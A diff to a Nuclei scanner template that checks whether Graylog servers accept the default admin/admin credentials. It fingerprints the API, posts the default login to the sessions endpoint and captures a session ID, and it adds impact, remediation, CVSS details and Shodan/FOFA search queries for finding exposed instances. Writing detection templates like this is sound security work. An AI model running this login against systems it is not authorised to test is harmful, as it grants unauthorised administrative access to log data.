@@ -1,41 +1,65 @@
 id: graylog-default-login
 info:
-  name: Graylog - Default Admin Credentials
-  author: 0x_Akoko
+  name: Graylog - Default Login
+  author: 0x_Akoko,0xBassia
   severity: high
   description: |
-    Detected that Graylog was using the default credentials admin:admin. The VM/OVA appliance shipped with admin:admin out of the box.
+    Graylog instance is accessible with default admin credentials (admin/admin). This provides full administrative access to the log management platform, including the ability to read all ingested logs, create inputs, configure pipelines, and manage users.
+  impact: |
+    An attacker with admin access to Graylog can read all collected log data which may contain credentials, API keys, internal IPs, and sensitive business information. They can also create new inputs to intercept future log data or modify pipelines to redirect/suppress logs.
+  remediation: |
+    Change the default root_password_sha2 in the Graylog server.conf configuration file. Use a strong, unique password for the admin account.
   reference:
     - https://go2docs.graylog.org/current/setting_up_graylog/rest_api.html
     - https://archivedocs.graylog.org/en/2.5/pages/installation/virtual_machine_appliances.html
+    - https://docs.graylog.org/docs/authentication
+    - https://docs.graylog.org/docs/server-conf
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id:
+      - CWE-798
   metadata:
     runzero-match: service["product"] contains "Graylog:Graylog"
-    fofa-query: 'app="Graylog" || title="Graylog Web Interface"'
+    fofa-query: app="Graylog" || title="Graylog Web Interface"
     max-request: 2
     product: graylog
-    shodan-query: 'title:"Graylog Web Interface"'
+    shodan-query: title:"Graylog Web Interface"
     vendor: graylog
     verified: true
-  tags: auth,default-login,graylog
+  tags: auth,default-login,graylog,logging
 variables:
-  username: "admin"
-  password: "admin"
+  password: admin
+  username: admin
 flow: http(1) && http(2)
 http:
-  - raw:
+  - matchers:
+      - condition: and
+        dsl:
+          - status_code == 200
+          - contains(content_type, "application/json")
+          - contains_all(body, "\"cluster_id\"", "\"node_id\"", "\"version\"")
+        internal: true
+        type: dsl
+    raw:
       - |
         GET /api/ HTTP/1.1
         Host: {{Hostname}}
         Accept: application/json
+  - extractors:
+      - name: session_id
+        part: body
+        regex:
+          - '"session_id"\s*:\s*"([^"]+)"'
+        type: regex
     matchers:
-      - type: dsl
-        internal: true
+      - condition: and
         dsl:
-          - 'status_code == 200'
-          - 'contains(content_type, "application/json")'
-          - 'contains_all(body, "\"cluster_id\"", "\"node_id\"", "\"version\"")'
-        condition: and
-  - raw:
+          - status_code == 200
+          - contains(content_type, "application/json")
+          - contains_all(body, "\"session_id\"", "\"valid_until\"")
+        type: dsl
+    raw:
       - |
         POST /api/system/sessions HTTP/1.1
         Host: {{Hostname}}
@@ -44,17 +68,3 @@ http:
         X-Requested-By: nuclei
 
         {"username":"{{username}}","password":"{{password}}","host":""}
-    matchers:
-      - type: dsl
-        dsl:
-          - 'status_code == 200'
-          - 'contains(content_type, "application/json")'
-          - 'contains_all(body, "\"session_id\"", "\"valid_until\"")'
-        condition: and
-    extractors:
-      - type: regex
-        name: session_id
-        part: body
-        regex:
-          - '"session_id"\s*:\s*"([^"]+)"'
-        # digest: 4b0a00483046022100e72fdd6a72fed4e63418a827d3f2f71fc440ec7db018260ae16f1559b328c0d90221008449134692b22d919b6236a99356dfca633d8373a3a4b5f86c646e78236f0b4c:922c64590222798bb761d5b6d8e72950
